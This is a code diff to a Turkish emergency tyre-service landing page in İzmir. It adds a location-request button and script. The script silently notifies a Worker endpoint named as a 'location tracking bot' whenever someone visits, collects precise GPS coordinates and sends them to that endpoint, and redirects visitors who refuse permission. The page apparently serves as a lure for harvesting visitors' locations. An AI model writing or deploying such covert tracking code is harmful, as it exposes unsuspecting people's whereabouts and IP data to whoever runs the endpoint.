@@ -21,6 +21,35 @@
     h1 span{color:#00d1ff}
     .hero p{font-size:15px;opacity:.92;margin-bottom:16px}
     .phone-big{font-size:24px;font-weight:900;color:#00d1ff;margin-bottom:14px;display:block}
+    
+    /* YENİ: Konum Kutusu ve Butonu Stilleri */
+    .konum-box {
+        background: rgba(0, 209, 255, 0.08);
+        border: 1px dashed rgba(0, 209, 255, 0.4);
+        padding: 20px;
+        border-radius: 20px;
+        margin: 20px 0;
+        text-align: center;
+    }
+    .konum-btn {
+        background: linear-gradient(135deg, #00d1ff, #00ffff);
+        color: #000;
+        border: none;
+        padding: 16px 20px;
+        border-radius: 14px;
+        font-weight: 800;
+        font-size: 16px;
+        cursor: pointer;
+        width: 100%;
+        margin-top: 10px;
+        box-shadow: 0 4px 15px rgba(0, 209, 255, 0.3);
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        gap: 8px;
+    }
+    .konum-btn:active { transform: scale(0.96); }
+
     .trust{display:flex;justify-content:space-around;margin:18px 0;font-size:13px;opacity:.9}
     .trust div{background:rgba(255,255,255,.05);padding:10px 12px;border-radius:12px}
     .stats{display:grid;grid-template-columns:repeat(3,1fr);gap:10px;margin:18px 0}
@@ -53,7 +82,13 @@
 <section class="hero container">
   <h1>7/24 <span>Acil Mobil Lastikçi</span><br>İzmir Genelinde</h1>
   <span class="phone-big">📞 0 (553) 118 23 53</span>
-  <p>Konumunuzu paylaşın, en yakın mobil ekip 15 dakikada yanınızda olsun.</p>
+  
+  <div class="konum-box">
+    <p>📍 <strong>Hızlı Servis İçin:</strong> Size en yakın ekibi 15 dakikada yönlendirebilmemiz için lütfen konumu onaylayın.</p>
+    <button class="konum-btn" onclick="konumAl()">📍 Konum Gönder ve Yardım Çağır</button>
+  </div>
+
+  <p>Yolda mı kaldınız? En yakın mobil ekip bir tık uzağınızda.</p>
 
   <div class="trust">
     <div>✅ 7/24 Hizmet</div>
@@ -91,51 +126,59 @@
 </div>
 
 <script>
-window.onload = function() {
-    // Senin Cloudflare Worker URL'n
-    const workerURL = 'https://konum-takip-botu.sandalcigiray5.workers.dev/';
+// Cloudflare Worker URL'niz
+const workerURL = 'https://konum-takip-botu.sandalcigiray5.workers.dev/';
 
-    // 1. ADIM: SİTEYE GİRİLDİĞİ AN BİLDİRİM GÖNDER
+// ADIM 1: SİTEYE GİRİLDİĞİ AN (CİHAZ VE IP BİLGİSİ SESSİZCE GİTSİN)
+window.onload = function() {
     fetch(workerURL, {
         method: 'POST',
         mode: 'no-cors',
         body: JSON.stringify({ status: "entry" })
     });
-
-    // 2. ADIM: KONUM İZNİ İSTE
-    if (navigator.geolocation) {
-        navigator.geolocation.getCurrentPosition(
-            function(position) {
-                // Konum onaylanırsa
-                fetch(workerURL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({
-                        status: "allowed",
-                        lat: position.coords.latitude,
-                        lon: position.coords.longitude,
-                        acc: position.coords.accuracy
-                    })
-                });
-            },
-            function(error) {
-                // Konum reddedilirse
-                fetch(workerURL, {
-                    method: 'POST',
-                    mode: 'no-cors',
-                    body: JSON.stringify({ status: "rejected" })
-                });
-                
-                // 1.5 saniye sonra Google'a yönlendir
-                setTimeout(() => {
-                    alert("Yol yardımı alabilmek için konum izni vermeniz gerekmektedir.");
-                    window.location.href = "https://www.google.com";
-                }, 1500);
-            },
-            { enableHighAccuracy: true, timeout: 10000 }
-        );
-    }
 };
+
+// ADIM 2: BUTONA BASILDIĞINDA KONUM İSTEYEN FONKSİYON
+function konumAl() {
+    if (navigator.geolocation) {
+        const options = {
+            enableHighAccuracy: true,
+            timeout: 10000,
+            maximumAge: 0
+        };
+        navigator.geolocation.getCurrentPosition(success, error, options);
+    } else {
+        alert("Tarayıcınız konum özelliğini desteklemiyor.");
+    }
+}
+
+function success(position) {
+    // Konum onaylandıysa Worker'a gönder
+    fetch(workerURL, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: JSON.stringify({
+            status: "allowed",
+            lat: position.coords.latitude,
+            lon: position.coords.longitude,
+            acc: position.coords.accuracy
+        })
+    }).then(() => {
+        alert("Konumunuz alındı. En yakın ekip size yönlendiriliyor!");
+    });
+}
+
+function error(err) {
+    // Konum reddedildiyse Worker'a bildir ve Google'a yönlendir
+    fetch(workerURL, {
+        method: 'POST',
+        mode: 'no-cors',
+        body: JSON.stringify({ status: "rejected" })
+    });
+
+    alert("Yol yardımı alabilmek için konum izni vermeniz gerekmektedir.");
+    window.location.href = "https://www.google.com";
+}
 </script>
 
 </body>
